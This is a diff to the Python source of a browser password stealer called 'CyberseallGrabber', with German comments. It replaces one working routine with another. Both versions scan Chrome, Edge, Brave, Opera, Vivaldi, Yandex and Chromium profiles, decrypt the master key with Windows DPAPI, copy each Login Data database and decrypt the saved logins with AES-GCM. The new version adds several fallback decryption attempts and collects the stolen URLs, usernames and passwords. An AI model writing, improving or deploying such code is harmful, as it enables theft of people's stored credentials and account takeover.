@@ -171,353 +171,259 @@ class CyberseallGrabber:
 
     def pw(self):
         try:
-            pw_data = []
+            # Erweiterte Browser-Pfade definieren
+            BROWSER_PATHS = {}
             
-            def get_encryption_key(browser_path):
-                """Extrahiert den Verschlüsselungsschlüssel aus Local State"""
-                try:
-                    local_state_file = os.path.join(browser_path, "Local State")
-                    if not os.path.exists(local_state_file):
-                        return None
-                    
-                    with open(local_state_file, "r", encoding="utf-8") as f:
-                        local_state_data = json.loads(f.read())
-                    
-                    # Extrahiere verschlüsselten Schlüssel
-                    encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
-                    encrypted_key_bytes = base64.b64decode(encrypted_key)
-                    
-                    # Entferne DPAPI Präfix (erste 5 Bytes: "DPAPI")
-                    encrypted_key_bytes = encrypted_key_bytes[5:]
-                    
-                    # Entschlüssele mit Windows DPAPI
-                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key_bytes, None, None, None, 0)[1]
-                    return decrypted_key
-                    
-                except Exception as e:
-                    return None
+            # Chrome Profile
+            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+            if os.path.exists(chrome_base):
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:
+                    profile_path = os.path.join(chrome_base, profile)
+                    if os.path.exists(profile_path):
+                        BROWSER_PATHS[f"Chrome ({profile})"] = {
+                            "profile_path": profile_path,
+                            "login_db": "\\Login Data"
+                        }
             
-            def decrypt_chrome_password(encrypted_password, key):
-                """Entschlüsselt Chrome/Chromium Passwörter"""
-                try:
-                    if not encrypted_password:
-                        return ""
-                    
-                    # Prüfe Verschlüsselungsversion
-                    if encrypted_password[:3] == b'v10':
-                        # Neue AES-GCM Verschlüsselung (Chrome 80+)
-                        nonce = encrypted_password[3:15]  # 12 Bytes Nonce
-                        ciphertext = encrypted_password[15:]  # Rest ist verschlüsselter Text
-                        
-                        # AES-GCM Entschlüsselung
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                        decrypted_password = cipher.decrypt(ciphertext[:-16])  # Entferne Auth-Tag
-                        return decrypted_password.decode('utf-8')
-                        
-                    elif encrypted_password[:3] == b'v11':
-                        # Neueste Verschlüsselung (Chrome 100+)
-                        nonce = encrypted_password[3:15]
-                        ciphertext = encrypted_password[15:]
-                        
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                        decrypted_password = cipher.decrypt(ciphertext[:-16])
-                        return decrypted_password.decode('utf-8')
-                        
-                    else:
-                        # Alte DPAPI Verschlüsselung (Chrome <80)
-                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-                        return decrypted_password.decode('utf-8')
-                        
-                except Exception as e:
-                    # Fallback: Versuche direkte DPAPI Entschlüsselung
-                    try:
-                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-                        return decrypted_password.decode('utf-8')
-                    except:
-                        return "DECRYPTION_FAILED"
+            # Edge Profile
+            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
+            if os.path.exists(edge_base):
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+                    profile_path = os.path.join(edge_base, profile)
+                    if os.path.exists(profile_path):
+                        BROWSER_PATHS[f"Edge ({profile})"] = {
+                            "profile_path": profile_path,
+                            "login_db": "\\Login Data"
+                        }
             
-            def extract_firefox_passwords():
-                """Extrahiert Passwörter aus Firefox"""
-                firefox_passwords = []
-                try:
-                    firefox_profile_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
-                    if not os.path.exists(firefox_profile_path):
-                        return firefox_passwords
-                    
-                    for profile_folder in os.listdir(firefox_profile_path):
-                        profile_path = os.path.join(firefox_profile_path, profile_folder)
-                        if not os.path.isdir(profile_path):
-                            continue
-                        
-                        # Suche nach logins.json
-                        logins_file = os.path.join(profile_path, "logins.json")
-                        if os.path.exists(logins_file):
-                            try:
-                                with open(logins_file, "r", encoding="utf-8") as f:
-                                    logins_data = json.loads(f.read())
-                                
-                                for login in logins_data.get("logins", []):
-                                    hostname = login.get("hostname", "")
-                                    username = login.get("encryptedUsername", "")
-                                    password = login.get("encryptedPassword", "")
-                                    
-                                    if hostname and username:
-                                        # Firefox Passwörter sind komplex verschlüsselt, zeige als verschlüsselt an
-                                        firefox_passwords.append(f"Firefox | {hostname} | {username} | [FIREFOX_ENCRYPTED]")
-                            except:
-                                continue
-                                
-                except Exception as e:
-                    pass
-                
-                return firefox_passwords
+            # Brave Profile
+            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
+            if os.path.exists(brave_base):
+                for profile in ["Default", "Profile 1", "Profile 2"]:
+                    profile_path = os.path.join(brave_base, profile)
+                    if os.path.exists(profile_path):
+                        BROWSER_PATHS[f"Brave ({profile})"] = {
+                            "profile_path": profile_path,
+                            "login_db": "\\Login Data"
+                        }
             
-            # Umfassende Browser-Konfiguration für 2025
-            browser_configs = [
-                # Google Chrome Varianten
-                {
-                    "name": "Google Chrome",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 2"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 3"),
-                    ],
-                    "login_file": "Login Data"
+            # Weitere Browser
+            other_browsers = {
+                "Opera": {
+                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+                    "login_db": "\\Login Data"
                 },
-                {
-                    "name": "Chrome Canary",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Profile 1"),
-                    ],
-                    "login_file": "Login Data"
+                "Opera GX": {
+                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+                    "login_db": "\\Login Data"
                 },
-                {
-                    "name": "Chrome Beta",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
+                "Vivaldi": {
+                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
+                    "login_db": "\\Login Data"
                 },
-                {
-                    "name": "Chrome Dev",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
+                "Yandex": {
+                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
+                    "login_db": "\\Ya Passman Data"
                 },
-                # Microsoft Edge Varianten
-                {
-                    "name": "Microsoft Edge",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 1"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 2"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Edge Beta",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Edge Dev",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Edge Canary",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge SxS", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                # Brave Browser
-                {
-                    "name": "Brave Browser",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Profile 1"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Dev", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                # Opera Varianten
-                {
-                    "name": "Opera",
-                    "paths": [
-                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Next"),
-                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Opera GX",
-                    "paths": [
-                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                # Vivaldi
-                {
-                    "name": "Vivaldi",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Profile 1"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi-Snapshot", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                # Yandex Browser
-                {
-                    "name": "Yandex Browser",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Profile 1"),
-                    ],
-                    "login_file": "Ya Passman Data"
-                },
-                # Weitere Chromium-basierte Browser
-                {
-                    "name": "Chromium",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Arc Browser",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Arc", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Thorium",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "Thorium", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
-                },
-                {
-                    "name": "Ungoogled Chromium",
-                    "paths": [
-                        os.path.join(os.getenv("LOCALAPPDATA"), "ungoogled-chromium", "User Data", "Default"),
-                    ],
-                    "login_file": "Login Data"
+                "Chromium": {
+                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
+                    "login_db": "\\Login Data"
                 }
-            ]
+            }
             
-            # Durchsuche alle Browser-Konfigurationen
-            for browser_config in browser_configs:
-                browser_name = browser_config["name"]
-                browser_paths = browser_config["paths"]
-                login_file = browser_config["login_file"]
-                
-                for browser_path in browser_paths:
+            # Füge andere Browser hinzu, wenn sie existieren
+            for name, data in other_browsers.items():
+                if os.path.exists(data["profile_path"]):
+                    BROWSER_PATHS[name] = data
+            
+            def decrypt_password(password, key):
+                try:
+                    if not password or len(password) < 3:
+                        return "Failed to decrypt"
+
+                    # Methode 1: AES-GCM Entschlüsselung (Chrome 80+)
                     try:
-                        # Prüfe ob Browser-Pfad existiert
-                        if not os.path.exists(browser_path):
+                        if password[:3] == b'v10' or password[:3] == b'v11':
+                            iv = password[3:15]
+                            encrypted_data = password[15:]
+                            cipher = AES.new(key, AES.MODE_GCM, iv)
+                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                            if decrypted_pass and len(decrypted_pass) > 0:
+                                return decrypted_pass
+                    except Exception as e:
+                        pass
+
+                    # Methode 2: Direkte AES-GCM ohne Version-Check
+                    try:
+                        if len(password) >= 15:
+                            iv = password[3:15]
+                            encrypted_data = password[15:]
+                            cipher = AES.new(key, AES.MODE_GCM, iv)
+                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                            if decrypted_pass and len(decrypted_pass) > 0:
+                                return decrypted_pass
+                    except Exception as e:
+                        pass
+
+                    # Methode 3: DPAPI Entschlüsselung (Chrome <80)
+                    try:
+                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
+                        if result and result[1]:
+                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
+                            if decrypted and len(decrypted) > 0:
+                                return decrypted
+                    except Exception as e:
+                        pass
+
+                    # Methode 4: Alternative AES-GCM mit verschiedenen IV-Längen
+                    try:
+                        for iv_start in [3, 0, 12]:
+                            for iv_len in [12, 16, 8]:
+                                if len(password) >= iv_start + iv_len + 16:
+                                    iv = password[iv_start:iv_start + iv_len]
+                                    encrypted_data = password[iv_start + iv_len:]
+                                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                    if decrypted_pass and len(decrypted_pass) > 0:
+                                        return decrypted_pass
+                    except Exception as e:
+                        pass
+
+                    # Methode 5: Rohe Bytes-Analyse für teilweise Wiederherstellung
+                    try:
+                        if isinstance(password, bytes) and len(password) > 10:
+                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
+                            if len(printable_chars) > 3:
+                                return f"Partial: {printable_chars[:50]}"
+                    except:
+                        pass
+
+                    return "Failed to decrypt"
+                except Exception as e:
+                    return f"Error: {str(e)[:30]}"
+            
+            def get_browser_passwords():
+                passwords = []
+                browser_data = BROWSER_PATHS
+
+                for browser, data in browser_data.items():
+                    try:
+                        profile_path = data["profile_path"]
+                        login_db = data["login_db"]
+
+                        if not os.path.exists(profile_path):
                             continue
-                        
-                        # Hole Verschlüsselungsschlüssel
-                        encryption_key = get_encryption_key(browser_path)
-                        if not encryption_key:
+
+                        if "signons.sqlite" in login_db:
                             continue
-                        
-                        # Pfad zur Login-Datenbank
-                        login_db_path = os.path.join(browser_path, login_file)
-                        if not os.path.exists(login_db_path):
+
+                        full_login_db_path = os.path.join(profile_path + login_db)
+                        if not os.path.exists(full_login_db_path):
                             continue
-                        
-                        # Erstelle temporäre Kopie der Datenbank
-                        temp_db_name = f"{browser_name.replace(' ', '_')}_{hash(browser_path)}_{os.getpid()}.db"
-                        temp_db_path = os.path.join(os.getenv("TEMP"), temp_db_name)
-                        
+
+                        state_file = os.path.join(profile_path, "Local State")
+                        if not os.path.exists(state_file):
+                            continue
+
+                        with open(state_file, "r", encoding="utf-8") as f:
+                            local_state = json.loads(f.read())
+                            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+
+                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_login_data.db")
+                        if os.path.exists(temp_db):
+                            os.remove(temp_db)
+
+                        with open(full_login_db_path, "rb") as login_data_file:
+                            with open(temp_db, "wb") as temp_file:
+                                temp_file.write(login_data_file.read())
+
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+
                         try:
-                            shutil.copy2(login_db_path, temp_db_path)
-                        except Exception as e:
-                            continue
-                        
-                        # Verbinde zur Datenbank und extrahiere Passwörter
-                        try:
-                            connection = sqlite3.connect(temp_db_path)
-                            cursor = connection.cursor()
-                            
-                            # Erweiterte SQL-Abfrage für alle möglichen Felder
-                            query = """
-                            SELECT 
-                                origin_url, 
-                                action_url, 
-                                username_value, 
-                                password_value,
-                                date_created,
-                                date_last_used,
-                                times_used
-                            FROM logins 
-                            WHERE username_value != '' OR password_value != ''
-                            ORDER BY date_last_used DESC
-                            """
-                            
-                            cursor.execute(query)
-                            login_records = cursor.fetchall()
-                            
-                            for record in login_records:
-                                origin_url = record[0] or "Unknown URL"
-                                action_url = record[1] or ""
-                                username = record[2] or "No Username"
-                                encrypted_password = record[3]
-                                date_created = record[4] or 0
-                                date_last_used = record[5] or 0
-                                times_used = record[6] or 0
-                                
-                                # Entschlüssele Passwort
-                                if encrypted_password:
-                                    decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
-                                else:
-                                    decrypted_password = "No Password"
-                                
-                                # Formatiere Passwort-Eintrag
-                                profile_name = os.path.basename(browser_path) if os.path.basename(browser_path) != browser_name else "Default"
-                                password_entry = f"{browser_name} ({profile_name}) | {origin_url} | {username} | {decrypted_password}"
-                                
-                                # Füge zusätzliche Informationen hinzu wenn verfügbar
-                                if times_used > 0:
-                                    password_entry += f" | Used: {times_used}x"
-                                
-                                pw_data.append(password_entry)
-                            
-                            connection.close()
-                            
-                        except Exception as e:
-                            if 'connection' in locals():
+                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                            login_data = cursor.fetchall()
+
+                            success_count = 0
+                            failed_count = 0
+
+                            for url, username, password in login_data:
+                                if not url or not username or not password:
+                                    continue
+
                                 try:
-                                    connection.close()
-                                except:
-                                    pass
-                        
-                        # Lösche temporäre Datei
+                                    decrypted_password = decrypt_password(password, master_key)
+
+                                    if url and username and decrypted_password:
+                                        if decrypted_password != "Failed to decrypt":
+                                            success_count += 1
+                                        else:
+                                            failed_count += 1
+
+                                        passwords.append({
+                                            "browser": browser,
+                                            "url": url,
+                                            "username": username,
+                                            "password": decrypted_password
+                                        })
+                                except Exception as e:
+                                    failed_count += 1
+                                    passwords.append({
+                                        "browser": browser,
+                                        "url": url,
+                                        "username": username,
+                                        "password": f"Error: {str(e)[:30]}"
+                                    })
+
+                            # Debug-Info in Datei schreiben statt print
+                            try:
+                                debug_file = os.path.join(self.d, "debug.txt")
+                                with open(debug_file, "a", encoding="utf-8") as df:
+                                    if success_count > 0:
+                                        df.write(f"Successfully decrypted {success_count} passwords from {browser} ({failed_count} failed)\n")
+                                    elif failed_count > 0:
+                                        df.write(f"Failed to decrypt all {failed_count} passwords from {browser}\n")
+                            except:
+                                pass
+
+                        except Exception as e:
+                            # Debug-Info in Datei schreiben statt print
+                            try:
+                                debug_file = os.path.join(self.d, "debug.txt")
+                                with open(debug_file, "a", encoding="utf-8") as df:
+                                    df.write(f"Error executing SQL query in {browser}: {str(e)}\n")
+                            except:
+                                pass
+
+                        cursor.close()
+                        conn.close()
+
                         try:
-                            os.remove(temp_db_path)
+                            os.remove(temp_db)
                         except:
                             pass
-                            
+
                     except Exception as e:
-                        continue
+                        # Debug-Info in Datei schreiben statt print
+                        try:
+                            debug_file = os.path.join(self.d, "debug.txt")
+                            with open(debug_file, "a", encoding="utf-8") as df:
+                                df.write(f"Error processing {browser}: {str(e)}\n")
+                        except:
+                            pass
+
+                return passwords
             
-            # Füge Firefox Passwörter hinzu
-            firefox_passwords = extract_firefox_passwords()
-            pw_data.extend(firefox_passwords)
+            # Hole alle Browser-Passwörter
+            password_data = get_browser_passwords()
+            
+            # Konvertiere zu String-Format für Kompatibilität
+            pw_data = []
+            for pwd in password_data:
+                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}"
+                pw_data.append(password_entry)
             
             # Speichere alle gefundenen Passwörter
             self.p = pw_data
